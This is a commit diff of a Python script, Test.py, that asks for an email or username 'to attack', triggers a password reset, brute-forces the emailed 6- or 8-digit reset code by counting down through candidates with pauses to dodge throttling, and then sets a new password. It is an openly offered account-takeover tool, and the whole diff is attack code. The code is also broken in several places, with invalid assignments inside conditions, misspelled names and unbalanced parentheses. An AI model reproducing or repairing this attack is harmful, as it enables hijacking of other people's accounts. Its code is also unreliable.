61044223d6c28b8cd8b2f5cbf0df442fc0c5a982
krarktel112 <krarktel@gmail.com>
2024-08-28 11:41:59 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -47,6 +47,7 @@ def try_password(self, email, password):
 os.system('clear')
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
+redo = 0
 """password = input('Password:')"""
 while newpass = test:
   browser = mechanize.Browser()
@@ -60,76 +61,82 @@ while newpass = test:
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
-browser.select_form(nr=0)
-browser.submit()
-browser.select_form(nr=0)
-browser.submit()
-browser.select_form(nr=0)
-browser.submit()
-"""reset code input"""
-browser.select_form(nr=0)
-reset = input('Code: ')
-browser.form['n'] = reset
-browser.submit()
-reset = 999999
-response1 = browser.response()
-soup = BeautifulSoup(response1, 'html.parser')
-test = soup.find(string="poop")
-check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-if check1 != test:
-  print(check1)
+  browser.select_form(nr=0)
+  browser.submit()
+  browser.select_form(nr=0)
+  browser.submit()
+  browser.select_form(nr=0)
+  browser.submit()
+  """reset code input"""
+  browser.select_form(nr=0)
+  reset = input('Code: ')
+  browser.form['n'] = reset
+  browser.submit()
   reset = 999999
-else:
-  print(check2)
-  reset = 99999999
-if check1 != test:
-  while check1 != test or reset > 999999:  
-    browser.select_form(nr=0)
-    y = reset
-    browser.form['n'] = str(y)
-    browser.submit()
-    print(str(reset), end='\r')
-    fail = (str(y), "failed")
-    s = " "
-    reset = reset-1
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-    if check2 == check4:
-      print(s.join(fail))
-      sleep(30)
-    else:
-      z = 1
-elif check2 != test:
-  while check2 != test or reset > 99999999:
-    browser.select_form(nr=0)
-    y = reset
-    browser.form['n'] = str(y)
-    browser.submit()
-    print(str(reset), end='\r')
-    fail = (str(y), "failed")
-    s = " "
-    reset = reset-1
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-    if check2 == check4:
-      print(s.join(fail))
-      sleep(30)
-    else:
-      z = 1
-else:
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
-  print(soup.find(string="password_new"))
-  yes = input('Continue/Exit? ')
-  if yes == 'n':
-    exit()
+  test = soup.find(string="poop")
+  check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+  check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+  check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+  check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+  if check1 != test and redo = 0:
+    print(check1)
+    reset = 999999
+  elif check2 != test and redo = 0:
+    print(check2)
+    reset = 99999999
+  if check1 != test:
+    while check1 != test or reset > 999999:  
+      browser.select_form(nr=0)
+      y = reset
+      browser.form['n'] = str(y)
+      browser.submit()
+      print(str(reset), end='\r')
+      fail = (str(y), "failed")
+      succeed = (str(y), "succeded")
+      s = " "
+      reset = reset-1
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+      if check1 == check3:
+        print(s.join(fail))
+        sleep(30)
+      else:
+        print(s.join(str(y), succeeed)
+  elif check2 != test:
+    while check2 != test or reset > 99999999:
+      browser.select_form(nr=0)
+      y = reset
+      browser.form['n'] = str(y)
+      browser.submit()
+      print(str(reset), end='\r')
+      fail = (str(y), "failed")
+      succeed = (str(y), "succeded")
+      s = " "
+      reset = reset-1
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+      if check2 == check4:
+        print(s.join(fail))
+        sleep(30)
+      else:
+        print(s.join(str(y), succeeed)
   else:
-    new = input('New Password: ')
-    browser.select_form(nr=0)
-    browser.form['password_new'] = new
-  """browser.form['n'] = x"""
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print(soup.find(string="password_new"))
+    yes = input('Continue/Exit? ')
+    if yes == 'n':
+      exit()
+    else:
+      newpass = soup.find(string="password_new")
+      new = input('New Password: ')
+      browser.select_form(nr=0)
+      browser.form['password_new'] = new
+    """browser.form['n'] = x"""
+  redo = 1
+  browser.close()
+
